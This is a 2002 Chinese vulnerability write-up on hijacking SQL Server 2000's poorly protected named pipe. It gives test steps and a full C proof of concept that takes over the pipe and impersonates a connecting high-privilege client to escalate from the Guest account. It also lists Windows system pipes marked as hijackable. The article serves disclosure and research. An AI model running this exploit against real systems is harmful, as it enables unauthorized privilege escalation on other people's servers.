---
title: "SQL SERVER 2000通讯管道后复用劫持"
date: 2002-11-01T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-459"
---

文章提交：[flashsky](http://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=20515) (flashsky1_at_sina.com)

转摘请注明作者和安全焦点

作者：FLASHSKY

SITE：[WWW.XFOCUS.NET](http://www.xfocus.net/)

邮件：flashsky@xfocus.org

SQL SERVER 2000通讯中，允许使用有名管道来进行通讯，一般情况下是如此命名的：

默认实例：\\.\pipe\sql\query

命名实例：\\.\pipe\MSSQL$instancename\sql\query 

也可以通过1434 UDP进行查询获得这个管道名称

但是由于SQL SERVER 2000对于这个管道的ACL设置为NULL，导致任何用户的权限都可以对这个管道进行劫持，以前的劫持都是利用先停掉服务，再建立这个名字管道，然后再启动服务来复用自己已经建立了名字的管道，但实际上SQL SERVER 2000会判断是否已有同名管道，然后会取别的名字，而且低级权限的用户也启动和停止不了服务（除非是利用一些漏洞），但是实际上对管道的测试却发现：如果ACL设置成NULL的话，即使是后命名的管道，也可以劫持先命令的管道，只需要简单复用管道，然后自己建立几个管道的连接不释放（具体建立几个估计和真正的管道

建立时的实例个数有关，如在我的测试下，\\.\pipe\sql\query只需要建立1个接可以劫持了，而\\.\pipe\lsass则需要4-5个之后才能劫持。不过\\.\pipe\lsass的ACL只能是管理员才能进行劫持）

如果攻击者复用了同名管道以后，建立起几个不释放的管道（消耗掉了正常管道的实例），然后再有客户发起的管道连接就进入了攻击者程序的管道监听流程，剩下的就是大家都知道的利用模拟函数获得发起者权限的老生常谈了：

下面就是一个简单的例子，实现对SQL SERVER 2000管道通讯的劫持

环境：SQL SERVER 2000+SP2

      WIN2000 SERVER中文版+SP3

测试流程：

     1。先建立SQL 服务器允许管道通讯，和集成WINDOWS 验证，添加一个具备高权限的允许SQL SERVER登陆的WINDOWS本机帐户，启动SQL SERVER服务

     2。C盘下建立一个TEST.TXT文件，设置ACL为GUEST全部拒绝，其他人都许可

     3。在另外一台机器B上，以添加的可以登陆SQL SERVER的服务器帐户登陆，然后设置客户端网络库只为管道（如果有多个，可能就会是随机选一个连接，而不肯定是管道进行通讯了）

     4。然后用SQL SERVER企业管理器建立一个SQL SERVER的连接，使用集成WINDOWS验证

     5。SQL SERVER这边的机器进入GUEST帐户运行下面C代码的程序，会显示先无法打开TEST.TXT文件，然后进行劫持，等待客户端管道连接

     6。在机器B上，连接SQL SERVER，然后主机A的程序就会截获这个管道扮演高权限登陆用户，然后可以打开先没权限打开的文件。

    当然这个攻击本身实际的意义可能不大，因为估计现在SQL SERVER用管道建立通讯的比较少，而且在都允许的情况下，一般会主动选择TCP方式进行连接，但同时说明了：一个缺乏很好ACL保护的管道，也可以用后发复用来进行劫持，这就减少了很多需要先停掉服务或预先预测的难题，在编写服务器端管道应用的时候也必须小心。

SQL SERVER 2000劫持代码

#include <windows.h>

#include <winbase.h>

#include <stdio.h>

#include <stdlib.h>

void main()

{

    HANDLE pipea;

    FILE * fp;

    DWORD ret;

    DWORD num;

    HANDLE pipeb[100];

    int i;

    int dwSize ;

    char szUser[256];    

    DWORD dwNumber = 0;

        //先的测试，在GUEST权限下无法打开此文件

    fp = fopen("C:\\test.txt","w");

    if(fp==NULL)

        printf("now you don't open file;\n");

    //建立起一个同名管道，复用已存在的SQL SERVER的

    pipea = CreateNamedPipe("\\\\.\\pipe\\sql\\query",

        PIPE_ACCESS_DUPLEX,

        PIPE_TYPE_MESSAGE|PIPE_WAIT,

        100,

        2048,

        2048,

        NMPWAIT_USE_DEFAULT_WAIT,

        NULL);

    if(pipea ==INVALID_HANDLE_VALUE)

    {

        ret = GetLastError();

        printf("error in createnamedpipe!code=%d\n",ret);

        return;

    }

    //损耗掉其他正常实例

    if(WaitNamedPipe("\\\\.\\pipe\\sql\\query",NMPWAIT_WAIT_FOREVER)==0)

    {

        printf("no this pipe\n");

        return;

    }

    //可以调整个数，SQL SERVER只需要调整一个就可以了

    for(i=0;i<1;i++)

    {

        Sleep(20);

        if((pipeb[i]=CreateFile("\\\\.\\pipe\\sql\\query",GENERIC_WRITE|GENERIC_READ,0,(LPSECURITY_ATTRIBUTES)NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,(HANDLE)NULL))==INVALID_HANDLE_VALUE)

        {

            printf("open pipe failed\n");

            return;

        }

        //WriteFile(pipeb[i],"test1",5,&num,NULL);

        //WriteFile(pipeb[i],"test2",5,&num,NULL);

    }

        //然后等待连接

    ConnectNamedPipe (pipea, NULL);

    ReadFile(pipea, (void *) &dwNumber, 4, &dwSize, NULL);

        //模拟连接进来的用户

    ImpersonateNamedPipeClient (pipea);

    dwSize = 256;

        //获得用户信息

    GetUserName(szUser, &dwSize);

    printf ("Impersonating: %s\n", szUser);    

        //然后再测试是否能打开这个文件，证明确实提升了权限

    fp = fopen("C:\\test.txt","w");

    if(fp!=NULL)

        printf("now you can open file\n");

    DisconnectNamedPipe(pipea);

    CloseHandle(pipea);

    for(i=0;i<1;i++)

        CloseHandle(pipeb[i]);    

    return;

} 

补充：

所有管道都有这个漏洞，就是看ACL能否允许你复用，只要能复用就可以

如//./pipe/lsass 我都可以劫持，但是他的ACL定义成只能administrator进行劫持

目前测试了一下默认的一些管道基本ACL设置好好，不允许低级权限用户复制，但SQL的管道显示ACL设置的很差

可能更多服务或者其他的第三方的服务中存在这样没有很好ACL保护的管道，那么就意味着后复用也可以劫持成功 

 

下面是我开启了所有默认的WIN的服务，然后获取的系统管道测试的结果（没有开启终端服务，我机器没装，装了终端服务的可以测一下），另外也不能说没有意义，我前面看见一篇文章还专门推荐用集成验证加管道通讯获得更安全的SQL SERVER呢，嘿嘿

Pipe name (Number of instances, Maximum instances)

InitShutdown (2, -1)<---------------可以在ADMIN下劫持

net\NtControlPipe5 (1, 1)

llsrpc (2, -1)   <---------------可以在ADMIN下劫持

000001e8.000 (2, -1) <-----------可以在ADMIN下劫持

net\NtControlPipe8 (1, 1)

net\NtControlPipe9 (1, 1)

ProfMapApi (2, -1)<--------------可以在ADMIN下劫持

epmapper (2, -1)<----------------可以在ADMIN下劫持

WMIEP_454 (2, -1)<---------------可以在ADMIN下劫持<------GUEST用户可劫持

WMIEP_444 (2, -1)<---------------可以在ADMIN下劫持<------GUEST用户可劫持

net\NtControlPipe11 (1, 1)

WMIEP_3c8 (2, -1)<---------------可以在ADMIN下劫持

net\NtControlPipe12 (1, 1)

net\NtControlPipe13 (1, 1)

nddeapi (2, -1)<-----------------可以在ADMIN下劫持<------GUEST用户可劫持

NetDDE (1, 1)                    返回所有管道实例都忙的错误信息，不知道是否ACL设置许可复用

net\NtControlPipe14 (1, 1)

Winsock2\CatalogChangeListener-e8-0 (1, 1)<-----------------可以在ADMIN下劫持

net\NtControlPipe15 (1, 1)

Winsock2\CatalogChangeListener-574-0 (1, 1)<-----------------可以在ADMIN下劫持

WMIEP_640 (2, -1)<-----------------可以在ADMIN下劫持

Winsock2\CatalogChangeListener-640-0 (1, 1)<-----------------可以在ADMIN下劫持

net\NtControlPipe25 (1, 1)

WMIEP_6f0 (2, -1)<-----------------可以在ADMIN下劫持

sql\console (1, -1)<---------------可以在ADMIN下劫持<------GUEST用户可劫持

SQL\QUERY (1, -1)<-----------------可以在ADMIN下劫持<------GUEST用户可劫持

net\NtControlPipe26 (1, 1)

tsx_listener (1, 1)         返回所有管道实例都忙的错误信息，不知道是否ACL设置许可复用

winreg (2, -1)<-----------------可以在ADMIN下劫持

Winsock2\CatalogChangeListener-6f0-0 (1, 1)<-----------------可以在ADMIN下劫持

其中在GUEST权限下可劫持的有

WMIEP_454 (2, -1)<---------------可以在ADMIN下劫持<------GUEST用户可劫持

WMIEP_444 (2, -1)<---------------可以在ADMIN下劫持<------GUEST用户可劫持

nddeapi (2, -1)<-----------------可以在ADMIN下劫持<------GUEST用户可劫持

sql\console (1, -1)<---------------可以在ADMIN下劫持<------GUEST用户可劫持

SQL\QUERY (1, -1)<-----------------可以在ADMIN下劫持<------GUEST用户可劫持

SQL 的就不说了，不过sql\console这个管道用于什么方面还不清楚，如果有默认的一些用途的话，估计也是一个点。

nddeapi的基本存在nddeapi的应用的话就可以发生

WMI的就难点，看这样子是随着发展每个连接都会新建起来的，那样后复用作用就不大，只能采用预测名字的方法提前复用来攻击，但是奇怪的是其权限是不同的，有些WMI的不能GUEST复用，有些又可以，有时间了具体测试一下WMI客户与服务器之间连接产生的管道通讯的情况，或许也是走一个默认的管道名，说不定就可以攻击了呢，：）
